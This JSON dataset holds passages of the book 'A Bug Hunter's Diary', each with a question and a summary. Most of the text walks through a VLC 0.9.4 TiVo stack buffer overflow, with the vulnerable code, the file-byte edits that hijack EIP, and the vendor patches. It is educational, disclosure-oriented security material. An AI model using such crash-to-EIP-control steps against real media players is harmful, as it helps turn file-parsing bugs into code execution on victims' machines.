[
  {
    "start": 1,
    "end": 9,
    "text": "ACknowleDgments\nI would like to thank the following people for their technical reviews\nand input on the book: Felix “FX” Lindner, Sebastian Krahmer, Dan\nRosenberg, Fabian Mihailowitsch, Steffen Tröscher, Andreas Kurtz,\nMarco Lorenz, Max Ziegler, René Schönfeldt, and Silke Klein, as well\nas Sondra Silverhawk, Alison Law, and everyone else at No Starch Press.\nintroDuCtion\nWelcome to A Bug Hunter’s Diary. This book describes the life cycles of\nseven interesting, real-life software security vulnerabilities I found over\nthe past several years. Each chapter focuses on one bug. I’ll explain\nhow I found the bug, the steps I took to exploit it, and how the vendor\neventually patched it.\nthe goals of this Book\nThe primary goal of this book is to provide you with practical exposure\nto the world of bug hunting. After reading this book, you will have a\nbetter understanding of the approaches that bug hunters use to find\nsecurity vulnerabilities, how they create proof-of-concept code to test\nthe vulnerabilities, and how they can report vulnerabilities to the\nvendor.\nThe secondary goal of this book is to tell the story behind each of\nthese seven bugs. I think they deserve it.\nwho should read the Book\nThis book is aimed at security researchers, security consultants, C/C++\nprogrammers, penetration testers, and anyone else who wants to dive\ninto the exciting world of bug hunting. To get the most out of the\nbook, you should have a solid grasp of the C programming language\nand be familiar with x86 assembly.\nIf you are new to vulnerability research, this book will help you to\nget acquainted with the different aspects of hunting, exploiting, and\nreporting software vulnerabilities. If you are an already-experienced\nbug hunter, this book will offer a new perspective on familiar chal-\nlenges and will likely make you chuckle at times—or put a knowing\nsmile on your face.\nDisclaimer\nThe goal of this book is to teach readers how to identify, protect\nagainst, and mitigate software security vulnerabilities. Understanding\nthe techniques used to find and exploit vulnerabilities is necessary to\nthoroughly grasp the underlying problems and appropriate mitigation\ntechniques. Since 2007, it is no longer legal to create or distribute\n“hacking tools” in Germany, my home country. Such tools include\nsimple port scanners as well as working exploits. Therefore, to comply\nwith the law, no full working exploit code is provided in this book.\nThe examples simply show the steps used to gain control of the exe-\ncution flow (the instruction pointer or program counter control) of\na vulnerable program.\nresources\nAll URLs referenced throughout the book as well as the code exam-\nples, errata, updates, and other information can be found at http://\nwww.trapkit.de/books/bhd/.\n2 Introduction\n1\nBug Hunting\nBug hunting is the process of finding bugs in software or hardware.\nIn this book, however, the term bug hunting will be used specifically to\ndescribe the process of finding security-critical software bugs. Security-\ncritical bugs, also called software security vulnerabilities, allow an\nattacker to remotely compromise systems, escalate local privileges,\ncross privilege boundaries, or otherwise wreak havoc on a system.\nAbout a decade ago, hunting for software security vulnerabilities\nwas mostly done as a hobby or as a way to gain media attention. Bug\nhunting found its way into the mainstream when people realized that\nit’s possible to profit from vulnerabilities.1\nSoftware security vulnerabilities, and programs that take advan-\ntage of such vulnerabilities (known as exploits), get a lot of press cov-\nerage. In addition, numerous books and Internet resources describe\nthe process of exploiting these vulnerabilities, and there are perpetual\ndebates over how to disclose bug findings. Despite all this, surprisingly\nlittle has been published on the bug-hunting process itself. Although\nterms like software vulnerability or exploit are widely used, many people—\neven many information security professionals —don’t know how bug\nhunters find security vulnerabilities in software.\nIf you ask 10 different bug hunters how they search through\nsoftware for security-related bugs, you will most likely get 10 different\nanswers. This is one of the reasons why there is not, and probably\nwill never be, a “cookbook” for bug hunting. Rather than trying and\nfailing to write a book of generalized instructions, I will describe the\napproaches and techniques that I used to find specific bugs in real-life\nsoftware. Hopefully this book will help you develop your own style so\nyou can find some interesting security-critical software bugs.\n1.1 for fun and profit\nPeople who hunt for bugs have a variety of goals and motivations.\nSome independent bug hunters want to improve software security,\nwhile others seek personal gain in the form of fame, media attention,\npayment, or employment. A company might want to find bugs to use\nthem as fodder for marketing campaigns. Of course, there are always\nthe bad apples who want to find new ways to break into systems or\nnetworks. On the other hand, some people simply do it for fun—or\nto save the world.\n☺\n1.2 Common techniques\nAlthough no formal documentation exists that describes the standard\nbug-hunting process, common techniques do exist. These techniques\ncan be split into two categories: static and dynamic. In static analysis, also\nreferred to as static code analysis, the source code of the software, or the\ndisassembly of a binary, is examined but not executed. Dynamic analy-\nsis, on the other hand, involves debugging or fuzzing the target software\nwhile it’s executing. Both techniques have pros and cons, and most bug\nhunters use a combination of static and dynamic techniques.\nMy Preferred Techniques\nMost of the time, I prefer the static analysis approach. I usually read\nthe source code or disassembly of the target software line by line and\ntry to understand it. However, reading all the code from beginning to\nend is generally not practical. When I’m looking for bugs, I typically\nstart by trying to identify where user-influenced input data enters the\nsoftware through an interface to the outside world. This could be net-\nwork data, file data, or data from the execution environment, to name\njust a few examples.\nNext, I study the different ways that the input data can travel\nthrough the software, while looking for any potentially exploitable\ncode that acts on the data. Sometimes I’m able to identify these entry\npoints solely by reading the source code (see Chapter 2) or the disas-\nsembly (see Chapter 6). In other cases, I have to combine static analy-\nsis with the results of debugging the target software (see Chapter 5)\nto find the input-handling code. I also tend to combine static and\ndynamic approaches when developing an exploit.\n4 Chapter 1\nAfter I’ve found a bug, I want to prove if it’s actually exploitable,\nso I attempt to build an exploit for it. When I build such an exploit, I\nspend most of my time in the debugger.\nPotentially Vulnerable Code Locations\nThis is only one approach to bug hunting. Another tactic for find-\ning potentially vulnerable locations in the code is to look at the code\nnear “unsafe” C/C++ library functions, such as strcpy() and strcat(),\nin search of possible buffer overflows. Alternatively, you could search\nthe disassembly for movsx assembler instructions in order to find sign-\nextension vulnerabilities. If you find a potentially vulnerable code loca-\ntion, you can then trace backward through the code to see whether\nthese code fragments expose any vulnerabilities accessible from an\napplication entry point. I rarely use this approach, but other bug\nhunters swear by it.\nFuzzing\nA completely different approach to bug hunting is known as fuzz-\ning. Fuzzing is a dynamic-analysis technique that consists of testing\nan application by providing it with malformed or unexpected input.\nThough I’m not an expert in fuzzing and fuzzing frameworks—I\nknow bug hunters who have developed their own fuzzing frameworks\nand find most of their bugs with their fuzzing tools—I do use this\napproach from time to time to determine where user-influenced\ninput enters the software and sometimes to find bugs (see Chapter 8).\nYou may be wondering how fuzzing can be used to identify where\nuser-influenced input enters the software. Imagine you have a com-\nplex application in the form of a binary that you want to examine for\nbugs. It isn’t easy to identify the entry points of such complex appli-\ncations, but complex software often tends to crash while processing\nmalformed input data. This can hold true for software that parses data\nfiles, such as office products, media players, or web browsers. Most of\nthese crashes are not security relevant (e.g., a division-by-zero bug in a\nbrowser), but they often provide an entry point where I can start look-\ning for user-influenced input data.\nFurther Reading\nThese are only a few of the available techniques and approaches\nthat can be used to find bugs in software. For more information on\nfinding security vulnerabilities in source code, I recommend Mark\nDowd, John McDonald, and Justin Schuh’s The Art of Software Security\nAssessment: Identifying and Preventing Software Vulnerabilities (Addison-\nWesley, 2007). If you want more information about fuzzing, see\nMichael Sutton, Adam Greene, and Pedram Amini’s Fuzzing: Brute\nForce Vulnerability Discovery (Addison-Wesley, 2007).\nBug Hunting 5\n1.3 memory errors\nThe vulnerabilities described in this book have one thing in common:\nThey all lead to exploitable memory errors. Such memory errors occur\nwhen a process, a thread, or the kernel is\n• Using memory it does not own (e.g., NULL pointer dereferences,\nas described in Section A.2)\n• Using more memory than has been allocated (e.g., buffer over-\nflows, as described in Section A.1)\n• Using uninitialized memory (e.g., uninitialized variables)2\n• Using faulty heap-memory management (e.g., double frees)3\nMemory errors typically happen when powerful C/C++ features\nlike explicit memory management or pointer arithmetic are used\nincorrectly.\nA subcategory of memory errors, called memory corruption, happens\nwhen a process, a thread, or the kernel modifies a memory location\nthat it doesn’t own or when the modification corrupts the state of the\nmemory location.\nIf you’re not familiar with such memory errors, I suggest you have\na look at Sections A.1, A.2, and A.3. These sections describe the basics\nof the programming errors and vulnerabilities discussed in this book.\nIn addition to exploitable memory errors, dozens of other vul-\nnerability classes exist. These include logical errors and web-specific\nvulnerabilities like cross-site scripting, cross-site request forgery, and\nSQL injection, to name just a few. However, these other vulnerability\nclasses are not the subject of this book. All the bugs discussed in this\nbook were the result of exploitable memory errors.\n1.4 tools of the trade\nWhen searching for bugs, or building exploits to test them, I need a\nway to see inside the workings of applications. I most often use debug-\ngers and disassemblers to gain that inside view.\nDebuggers\nA debugger normally provides methods to attach to user space pro-\ncesses or the kernel, write and read values to and from registers and\nmemory, and to control program flow using features such as break-\npoints or single-stepping. Each operating system typically ships with its\nown debugger, but several third-party debuggers are available as well.\nTable 1-1 lists the different operating system platforms and the debug-\ngers used in this book.\n6 Chapter 1\nTable 1-1: Debuggers Used in This Book\nOperating Debugger Kernel\nsystem debugging\nMicrosoft WinDbg (the official debugger from Microsoft) yes\nWindows OllyDbg and its variant Immunity Debugger no\nLinux The GNU Debugger (gdb) yes\nSolaris The Modular Debugger (mdb) yes\nMac OS X The GNU Debugger (gdb) yes\nApple iOS The GNU Debugger (gdb) yes\nThese debuggers will be used to identify, analyze and exploit the\nvulnerabilities that I discovered. See also Sections B.1, B.2, and B.4 for\nsome debugger command cheat sheets.\nDisassemblers\nIf you want to audit an application and don’t have access to the source\ncode, you can analyze the program binaries by reading the applica-\ntion’s assembly code. Although debuggers have the ability to disassem-\nble the code of a process or the kernel, they usually are not especially\neasy or intuitive to work with. A program that fills this gap is the Inter-\nactive Disassembler Professional, better known as IDA Pro.4 IDA Pro\nsupports more than 50 families of processors and provides full interac-\ntivity, extensibility, and code graphing. If you want to audit a program\nbinary, IDA Pro is a must-have. For an exhaustive treatment of IDA\nPro and all of its features, consult Chris Eagle’s The IDA Pro Book, 2nd\nedition (No Starch Press, 2011).\n1.5 eip = 41414141\nTo illustrate the security implications of ← Instruction pointer/\nthe bugs that I found, I will discuss the steps Program counter:\nneeded to gain control of the execution flow • EIP — 32-bit instruction\nof the vulnerable program by controlling pointer (IA-32)\nthe instruction pointer (IP) of the CPU. The • RIP — 64-bit instruction\ninstruction pointer or program counter (PC) pointer (Intel 64)\nregister contains the offset in the current • R15 or PC — ARM\ncode segment for the next instruction to be architecture as used on\nexecuted.5 If you gain control of this regis- Apple’s iPhone\nter, you fully control the execution flow of\nthe vulnerable process. To demonstrate instruction pointer con-\ntrol, I will modify the register to values like 0x41414141 (hexadecimal\nrepresentation of ASCII “AAAA”), 0x41424344 (hexadecimal representa-\ntion of ASCII “ABCD”), or something similar. So if you see EIP = 41414141\nBug Hunting 7\nin the following chapters, it means that I’ve gained control of the\nvulnerable process.\nOnce you achieve control over the instruction pointer, there are\nmany ways to turn it into a fully working, weaponized exploit. For\nmore information on the process of exploit development, you can\nrefer to Jon Erickson’s Hacking: The Art of Exploitation, 2nd edition\n(No Starch Press, 2008), or you can type exploit writing into Google\nand browse through the enormous amount of material available\nonline.\n1.6 final note\nWe’ve covered a lot of ground in this chapter, and you might be left\nwith a lot of questions. Don’t worry—that’s a fine place to be. The\nfollowing seven diary chapters delve into more detail on the topics\nintroduced here and will answer many of your questions. You can also\nread through the appendixes for background information on various\ntopics discussed throughout this book.\nnote The diary chapters are not in chronological order. They’re arranged\naccording to the subject matter so that the concepts build on one\nanother.\nnotes\n1. See Pedram Amini, “Mostrame la guita! Adventures in Buying Vulnerabili-\nties,” 2009, http://docs.google.com/present/view?id=dcc6wpsd_20ghbpjxcr ; Charlie\nMiller, “The Legitimate Vulnerability Market: Inside the Secretive World\nof 0-day Exploit Sales,” 2007, http://weis2007.econinfosec.org/papers/29.pdf ;\niDefense Labs Vulnerability Contribution Program, https://labs.idefense.com/\nvcpportal/login.html; TippingPoint’s Zero Day Initiative, http://www.zeroday\ninitiative.com/.\n2. See Daniel Hodson, “Uninitialized Variables: Finding, Exploiting, Auto-\nmating” (presentation, Ruxcon, 2008), http://felinemenace.org/~mercy/slides/\nRUXCON2008-UninitializedVariables.pdf.\n3. See Common Weakness Enumeration, CWE List, CWE - Individual Dic-\ntionary Definition (2.0), CWE-415: Double Free at http://cwe.mitre.org/data/\ndefinitions/415.html .\n4. See http://www.hex-rays.com/idapro/.\n5. See Intel ® 64 and IA-32 Architectures Software Developer’s Manual, Volume 1:\nBasic Architecture at http://www.intel.com/products/processor/manuals/.\n8 Chapter 1",
    "question": "What is the primary purpose of the book \"A Bug Hunter’s Diary\"?",
    "summary": "This book details the life cycles of seven real software security vulnerabilities I discovered. It explains how each bug was found, exploited, and patched. The primary goal is to teach readers how to identify and mitigate software security issues, while also sharing the stories behind each vulnerability. The book is intended for security researchers, programmers, and penetration testers who want to learn about bug hunting techniques."
  },
  {
    "start": 10,
    "end": 26,
    "text": "2\nBACk to tHe ’90s\nSunday, October 12, 2008\nDear Diary,\nI had a look at the source code of VideoLAN’s popular VLC media\nplayer today. I like VLC because it supports all different kinds of\nmedia files and runs on all my favorite operating system platforms.\nBut supporting all those different media file formats has downsides.\nVLC does a lot of parsing, and that often means a lot of bugs just wait-\ning to be discovered.\nnote According to Parsing Techniques: A Practical Guide by Dick\nGrune and Ceriel J.H. Jacobs,1 “Parsing is the process of structur-\ning a linear representation in accordance with a given grammar.”\nA parser is software that breaks apart a raw string of bytes into indi-\nvidual words and statements. Depending on the data format, parsing\ncan be a very complex and error-prone task.\nAfter I became familiar with the inner workings of VLC, finding\nthe first vulnerability took me only about half a day. It was a classic\nstack buffer overflow (see Section A.1). This one occurred while\nparsing a media file format called TiVo, the proprietary format native\nto TiVo digital recording devices. Before finding this bug, I had never\nheard of this file format, but that didn’t stop me from exploiting it.\n2.1 Vulnerability Discovery\nHere is how I found the vulnerability:\n← I used VLC 0.9.4 on\n• Step 1: Generate a list of the demuxers V th is e t a M S ic P r 1 os ( o 3 ft 2 W -b i i n t d ) ows\nof VLC. platform for all the\n• Step 2: Identify the input data.\nfollowing steps.\n• Step 3: Trace the input data.\nI’ll explain this process in detail in the following sections.\nStep 1: Generate a List of the Demuxers of VLC\nAfter downloading and unpacking the source code of VLC,2 I gener-\nated a list of the available demuxers of the media player.\nnote In digital video, demuxing or demultiplexing refers to the process\nof separating audio and video as well as other data from a video stream\nor container in order to play the file. A demuxer is software that extracts\nthe components of such a stream or container.\nGenerating a list of demuxers wasn’t too hard, as VLC separates\nmost of them in different C files in the directory vlc-0.9.4\\modules\\\ndemux\\ (see Figure 2-1).\nFigure 2-1: VLC demuxer list\n10 Chapter 2\nStep 2: Identify the Input Data\nNext, I tried to identify the input data processed by the demuxers.\nAfter reading some C code, I stumbled upon the following structure,\nwhich is declared in a header file included in every demuxer.\nSource code file vlc-0.9.4\\include\\vlc_demux.h\n[..]\n41 struct demux_t\n42 {\n43 VLC_COMMON_MEMBERS\n44\n45 /* Module properties */\n46 module_t *p_module;\n47\n48 /* eg informative but needed (we can have access+demux) */\n49 char *psz_access;\n50 char *psz_demux;\n51 char *psz_path;\n52\n53 /* input stream */\n54 stream_t *s; /* NULL in case of a access+demux in one */\n[..]\nIn line 54, the structure element s is declared and described as\ninput stream. This was exactly what I was searching for: a reference to\nthe input data that is processed by the demuxers.\nStep 3: Trace the Input Data\nAfter I discovered the demux_t structure and its input stream element,\nI searched the demuxer files for references to it. The input data was\nusually referenced by p_demux->s, as shown in lines 1623 and 1641\nbelow. When I found such a reference, I traced the input data while\nlooking for coding errors. Using this approach, I found the following\nvulnerability.\nSource code file vlc-0.9.4\\modules\\demux\\Ty.c\nFunction parse_master()\n[..]\n1623 static void parse_master(demux_t *p_demux)\n1624 {\n1625 demux_sys_t *p_sys = p_demux->p_sys;\n1626 uint8_t mst_buf[32];\n1627 int i, i_map_size;\n1628 int64_t i_save_pos = stream_Tell(p_demux->s);\n1629 int64_t i_pts_secs;\n1630\n1631 /* Note that the entries in the SEQ table in the stream may have\n1632 different sizes depending on the bits per entry. We store them\n1633 all in the same size structure, so we have to parse them out one\n1634 by one. If we had a dynamic structure, we could simply read the\n1635 entire table directly from the stream into memory in place. */\nBack to the ’90s 11\n1636\n1637 /* clear the SEQ table */\n1638 free(p_sys->seq_table);\n1639\n1640 /* parse header info */\n1641 stream_Read(p_demux->s, mst_buf, 32);\n1642 i_map_size = U32_AT(&mst_buf[20]); /* size of bitmask, in bytes */\n1643 p_sys->i_bits_per_seq_entry = i_map_size * 8;\n1644 i = U32_AT(&mst_buf[28]); /* size of SEQ table, in bytes */\n1645 p_sys->i_seq_table_size = i / (8 + i_map_size);\n1646\n1647 /* parse all the entries */\n1648 p_sys->seq_table = malloc(p_sys->i_seq_table_size * sizeof(ty_seq_table_t));\n1649 for (i=0; i<p_sys->i_seq_table_size; i++) {\n1650 stream_Read(p_demux->s, mst_buf, 8 + i_map_size);\n[..]\nThe stream_Read() function in line 1641 reads 32 bytes of user-\ncontrolled data from a TiVo media file (referenced by p_demux->s) and\nstores them in the stack buffer mst_buf, declared in line 1626. The\nU32_AT macro in line 1642 then extracts a user-controlled value from\nmst_buf and stores it in the signed int variable i_map_size. In line 1650,\nthe stream_Read() function stores user-controlled data from the media\nfile in the stack buffer mst_buf again. But this time, stream_Read() uses\nthe user-controlled value of i_map_size to calculate the size of the data\nthat gets copied into mst_buf. This leads to a straight stack buffer over-\nflow (see Section A.1) that can be easily exploited.\nHere is the anatomy of the bug, as illustrated in Figure 2-2:\n1. 32 bytes of user-controlled TiVo media file data are copied\ninto the stack buffer mst_buf. The destination buffer has a size\nof 32 bytes.\n2. 4 bytes of user-controlled data are extracted from the buffer and\nstored in i_map_size.\n3. User-controlled TiVo media-file data is copied into mst_buf once\nagain. This time, the size of the copied data is calculated using\ni_map_size. If i_map_size has a value greater than 24, a stack buffer\noverflow will occur (see Section A.1).\n2.2 exploitation\nTo exploit the vulnerability, I performed the following steps:\n• Step 1: Find a sample TiVo movie file.\n• Step 2: Find a code path to reach the vulnerable code.\n• Step 3: Manipulate the TiVo movie file to crash VLC.\n• Step 4: Manipulate the TiVo movie file to gain control of EIP.\n12 Chapter 2\nStack before Stack after\noverflow overflow\nTiVo File TiVo File\nRET RET\np_demux->s\n32 Bytes (1)\np_demux->s\nmst_buf (3) mst_buf\n(2) i_map_size +\n8 Bytes\ni_map_size i_map_size\nBack to the ’90s 13\nnoitcerid\ngnitirw\nFigure 2-2: Overview of the vulnerability from input to stack buffer overflow\nThere’s more than one way to exploit a file-format bug. You can\ncreate a file with the right format from scratch, or you can manipulate\na valid preexisting file. I chose the latter in this example.\nStep 1: Find a Sample TiVo Movie File\n← The website http://samples\nFirst I downloaded the following .mplayerhq.hu/ is a good starting\nTiVo sample file from http://samples point to search for all kinds of\n.mplayerhq.hu/: multimedia file-format samples.\n$ wget http://samples.mplayerhq.hu/TiVo/test-dtivo-junkskip.ty%2b\n--2008-10-12 21:12:25-- http://samples.mplayerhq.hu/TiVo/test-dtivo-junkskip.ty%2b\nResolving samples.mplayerhq.hu... 213.144.138.186\nConnecting to samples.mplayerhq.hu|213.144.138.186|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 5242880 (5.0M) [text/plain]\nSaving to: `test-dtivo-junkskip.ty+´\n100%[=========================>] 5,242,880 240K/s in 22s\n2008-10-12 21:12:48 (232 KB/s) - `test-dtivo-junkskip.ty+´ saved [5242880/5242880]\nStep 2: Find a Code Path to Reach the Vulnerable Code\nI couldn’t find documentation on the specifications of the TiVo file\nformat, so I read the source code in order to find a path to reach the\nvulnerable code in parse_master().\nIf a TiVo file is loaded by VLC, the following execution flow is\ntaken (all source code references are from vlc-0.9.4\\modules\\demux\\Ty.c\nof VLC). The first relevant function that’s called is Demux():\n[..]\n386 static int Demux( demux_t *p_demux )\n387 {\n388 demux_sys_t *p_sys = p_demux->p_sys;\n389 ty_rec_hdr_t *p_rec;\n390 block_t *p_block_in = NULL;\n391\n392 /*msg_Dbg(p_demux, \"ty demux processing\" );*/\n393\n394 /* did we hit EOF earlier? */\n395 if( p_sys->eof )\n396 return 0;\n397\n398 /*\n399 * what we do (1 record now.. maybe more later):\n400 * - use stream_Read() to read the chunk header & record headers\n401 * - discard entire chunk if it is a PART header chunk\n402 * - parse all the headers into record header array\n403 * - keep a pointer of which record we're on\n404 * - use stream_Block() to fetch each record\n405 * - parse out PTS from PES headers\n406 * - set PTS for data packets\n407 * - pass the data on to the proper codec via es_out_Send()\n408\n409 * if this is the first time or\n410 * if we're at the end of this chunk, start a new one\n411 */\n412 /* parse the next chunk's record headers */\n413 if( p_sys->b_first_chunk || p_sys->i_cur_rec >= p_sys->i_num_recs )\n414 {\n415 if( get_chunk_header(p_demux) == 0 )\n[..]\nAfter some sanity checks in lines 395 and 413, the function\nget_chunk_header() is called in line 415.\n[..]\n112 #define TIVO_PES_FILEID ( 0xf5467abd )\n[..]\n1839 static int get_chunk_header(demux_t *p_demux)\n1840 {\n1841 int i_readSize, i_num_recs;\n1842 uint8_t *p_hdr_buf;\n1843 const uint8_t *p_peek;\n1844 demux_sys_t *p_sys = p_demux->p_sys;\n1845 int i_payload_size; /* sum of all records' sizes */\n1846\n1847 msg_Dbg(p_demux, \"parsing ty chunk #%d\", p_sys->i_cur_chunk );\n1848\n1849 /* if we have left-over filler space from the last chunk, get that */\n1850 if (p_sys->i_stuff_cnt > 0) {\n14 Chapter 2\n1851 stream_Read( p_demux->s, NULL, p_sys->i_stuff_cnt);\n1852 p_sys->i_stuff_cnt = 0;\n1853 }\n1854\n1855 /* read the TY packet header */\n1856 i_readSize = stream_Peek( p_demux->s, &p_peek, 4 );\n1857 p_sys->i_cur_chunk++;\n1858\n1859 if ( (i_readSize < 4) || ( U32_AT(&p_peek[ 0 ] ) == 0 ))\n1860 {\n1861 /* EOF */\n1862 p_sys->eof = 1;\n1863 return 0;\n1864 }\n1865\n1866 /* check if it's a PART Header */\n1867 if( U32_AT( &p_peek[ 0 ] ) == TIVO_PES_FILEID )\n1868 {\n1869 /* parse master chunk */\n1870 parse_master(p_demux);\n1871 return get_chunk_header(p_demux);\n1872 }\n[..]\nIn line 1856 of get_chunk_header(), the user-controlled data\nfrom the TiVo file is assigned to the pointer p_peek. Then, in line 1867,\nthe process checks whether the file data pointed to by p_peek equals\nTIVO_PES_FILEID (which is defined as 0xf5467abd in line 112). If so, the\nvulnerable function parse_master() gets called (see line 1870).\nTo reach the vulnerable function using this code path, the TiVo\nsample file had to contain the value of TIVO_PES_FILEID. I searched the\nTiVo sample file for the TIVO_PES_FILEID pattern and found it at file\noffset 0x00300000 (see Figure 2-3).\n00300000h: F5 46 7A BD 00 00 00 02 00 02 00 00 00 01 F7 04 ; õFz½..........÷.\n00300010h: 00 00 00 08 00 00 00 02 3B 9A CA 00 00 00 01 48 ; ........;šÊ....H\nFigure 2-3: TIVO_PES_FILEID pattern in TiVo sample file\nBased on the information from the parse_master() function (see\nthe following source code snippet) the value of i_map_size should be\nfound at offset 20 (0x14) relative to the TIVO_PES_FILEID pattern found\nat file offset 0x00300000.\n[..]\n1641 stream_Read(p_demux->s, mst_buf, 32);\n1642 i_map_size = U32_AT(&mst_buf[20]); /* size of bitmask, in bytes */\n[..]\nAt this point, I had discovered that the TiVo sample file I down-\nloaded already triggers the vulnerable parse_master() function, so it\nwouldn’t be necessary to adjust the sample file. Great!\nBack to the ’90s 15\nGet the → Step 3: Manipulate the TiVo Movie File to Crash VLC\nvulnerable\nNext, I tried to manipulate the TiVo sample file in order to crash\nWindows version\nof VLC from VLC. To achieve this, all I had to do was change the 4-byte value at the\nhttp://download sample file offset of i_map_size (which was 0x00300014 in this example).\n.videolan.org/ As illustrated in Figure 2-4, I changed the 32-bit value at file offset\npub/videolan/\n0x00300014 from 0x00000002 to 0x000000ff. The new value of 255 bytes\nvlc/0.9.4/\n(0xff) should be enough to overflow the 32-byte stack buffer and to\nwin32/.\noverwrite the return address stored after the buffer on the stack (see\nSection A.1). Next, I opened the altered sample file with VLC while\ndebugging the media player with Immunity Debugger.3 The movie file\nwas played as before, but after a few seconds—as soon as the altered\nfile data was processed—the VLC player crashed, with the result\nshown in Figure 2-5.\n00300010h: 00 00 00 08 00 00 00 02 3B 9A CA 00 00 00 01 48 ; ........;šÊ....H\n00300010h: 00 00 00 08 00 00 00 ff 3B 9A CA 00 00 00 01 48 ; ........;šÊ....H\nFigure 2-4: New value for i_map_size in TiVo sample file\nFigure 2-5: VLC access violation in Immunity Debugger\nAs expected, VLC crashed while parsing the malformed TiVo\nfile. The crash was very promising, since the instruction pointer (EIP\n16 Chapter 2\nregister) was pointing to an invalid memory location (indicated by the\nmessage Access violation when executing [20030000] in the status bar of\nthe debugger). This might mean that I could easily gain control of the\ninstruction pointer.\nStep 4: Manipulate the TiVo Movie File to Gain Control of EIP\nMy next step was to determine which bytes of the sample file actu-\nally overwrote the return address of the current stack frame so that\nI could take control of EIP. The debugger stated that EIP had a value\nof 0x20030000 at the time of the crash. To determine which offset\nthis value is found at, I could try to calculate the exact file offset, or\nI could simply search the file for the byte pattern. I chose the latter\napproach and started from file offset 0x00300000. I found the desired\nbyte sequence at file offset 0x0030005c, represented in little-endian\nnotation, and I changed the 4 bytes to the value 0x41414141 (as illus-\ntrated in Figure 2-6).\n00300050h: 56 4A 00 00 03 1F 6C 49 6A A0 25 45 00 00 03 20 ; VJ....lIj %E...\n00300050h: 56 4A 00 00 03 1F 6C 49 6A A0 25 45 41 41 41 41 ; VJ....lIj %EAAAA\nFigure 2-6: New value for EIP in TiVo sample file\nI then restarted VLC in the debugger and opened the new file\n(see Figure 2-7).\nFigure 2-7: EIP control of VLC media player\nBack to the ’90s 17\nEIP = 41414141 . . . Mission EIP control accomplished! I was able to\nbuild a working exploit, intended to achieve arbitrary code execution,\nusing the well-known jmp reg technique, as described in “Variations in\nExploit Methods Between Linux and Windows” by David Litchfield.4\nSince Germany has strict laws against it, I will not provide you with\na full working exploit, but if you’re interested, you can watch a short\nvideo I recorded that shows the exploit in action.5\n2.3 Vulnerability remediation\nSaturday, October 18, 2008\nNow that I’ve discovered a security vulnerability, I could disclose it in\nseveral ways. I could contact the software developer and “responsibly”\ntell him what I’ve found and help him to create a patch. This process\nis referred to as responsible disclosure. Since this term implies that other\nmeans of disclosure are irresponsible, which isn’t necessarily true, it is\nslowly being replaced by coordinated disclosure.\nOn the other hand, I could sell my findings to a vulnerability broker\nand let him tell the software developer. Today, the two primary players\nin the commercial vulnerability market are Verisign’s iDefense Labs,\nwith its Vulnerability Contribution Program (VCP), and Tipping Point’s\nZero Day Initiative (ZDI). Both VCP and ZDI follow coordinated-\ndisclosure practices and work with the affected vendor.\nAnother option is full disclosure. If I chose full disclosure, I would\nrelease the vulnerability information to the public without notifying\nthe vendor. There are other disclosure options, but the motivation\nbehind them usually doesn’t involve fixing the bug (for example, sell-\ning the findings in underground markets).6\nIn the case of the VLC vulnerability described in this chapter, I\nchose coordinated disclosure. In other words, I notified the VLC main-\ntainers, provided them with the necessary information, and coordi-\nnated with them on the timing of public disclosure.\nAfter I informed the VLC maintainers about the bug, they devel-\noped the following patch to address the vulnerability:7\n--- a/modules/demux/ty.c\n+++ b/modules/demux/ty.c\n@@ -1639,12 +1639,14 @@ static void parse_master(demux_t *p_demux)\n/* parse all the entries */\np_sys->seq_table = malloc(p_sys->i_seq_table_size * sizeof(ty_seq_table_t));\nfor (i=0; i<p_sys->i_seq_table_size; i++) {\n- stream_Read(p_demux->s, mst_buf, 8 + i_map_size);\n+ stream_Read(p_demux->s, mst_buf, 8);\np_sys->seq_table[i].l_timestamp = U64_AT(&mst_buf[0]);\nif (i_map_size > 8) {\nmsg_Err(p_demux, \"Unsupported SEQ bitmap size in master chunk\");\n+ stream_Read(p_demux->s, NULL, i_map_size);\nmemset(p_sys->seq_table[i].chunk_bitmask, i_map_size, 0);\n18 Chapter 2\n} else {\n+ stream_Read(p_demux->s, mst_buf + 8, i_map_size);\nmemcpy(p_sys->seq_table[i].chunk_bitmask, &mst_buf[8], i_map_size);\n}\n}\nThe changes are quite straightforward. The formerly vulnerable\ncall to stream_Read() now uses a fixed size value, and the user-controlled\nvalue of i_map_size is used only as a size value for stream_Read() if it is\nless than or equal to 8. An easy fix for an obvious bug.\nBut wait—is the vulnerability really gone? The variable i_map_size is\nstill of the type signed int. If a value greater than or equal to 0x80000000\nis supplied for i_map_size, it’s interpreted as negative, and the overflow\nwill still occur in the stream_Read() and memcpy() functions of the else\nbranch of the patch (see Section A.3 for a description of unsigned int\nand signed int ranges). I also reported this problem to the VLC main-\ntainers, resulting in another patch:8\n[..]\n@@ -1616,7 +1618,7 @@ static void parse_master(demux_t *p_demux)\n{\ndemux_sys_t *p_sys = p_demux->p_sys;\nuint8_t mst_buf[32];\n- int i, i_map_size;\n+ uint32_t i, i_map_size;\nint64_t i_save_pos = stream_Tell(p_demux->s);\nint64_t i_pts_secs;\n[..]\nNow that i_map_size is of the type unsigned int, this bug is fixed.\nPerhaps you’ve already noticed that the parse_master() function con-\ntains another buffer overflow vulnerability. I also reported that bug to\nthe VLC maintainers. If you can’t spot it, then take a closer look at the\nsecond patch provided by the VLC maintainers, which fixed this bug\nas well.\nOne thing that surprised me was the fact that none of the lauded\nexploit mitigation techniques of Windows Vista were able to stop me\nfrom taking control of EIP and executing arbitrary code from the\nstack using the jmp reg technique. The security cookie or /GS feature\nshould have prevented the manipulation of the return address. Fur-\nthermore, ASLR or NX/DEP should have prevented arbitrary code\nexecution. (See Section C.1 for a detailed description of all of these\nmitigation techniques.)\nTo solve this mystery, I downloaded Process Explorer9 and config-\nured it to show the processes’ DEP and ASLR status.\nBack to the ’90s 19\nnote To configure Process Explorer to show the processes’ DEP and ASLR\nstatus, I added the following columns to the view: View4Select\nColumns4DEP Status and View4Select Columns4ASLR\nEnabled. Additionally, I set the lower pane to view DLLs for a\nprocess and added the “ASLR Enabled” column.\nThe output of Process Explorer, illustrated in Figure 2-8, shows\nthat VLC and its modules use neither DEP nor ASLR (this is denoted\nby an empty value in the DEP and ASLR columns). I investigated fur-\nther to determine why the VLC process does not use these mitigation\ntechniques.\nFigure 2-8: VLC in Process Explorer\nDEP can be controlled by system policy through special APIs and\ncompile-time options (see Microsoft’s Security Research and Defense\nblog 10 for more information on DEP). The default system-wide DEP\npolicy for client operating systems such as Windows Vista is called\nOptIn. In this mode of operation, DEP is enabled only for processes\nthat explicitly opt in to 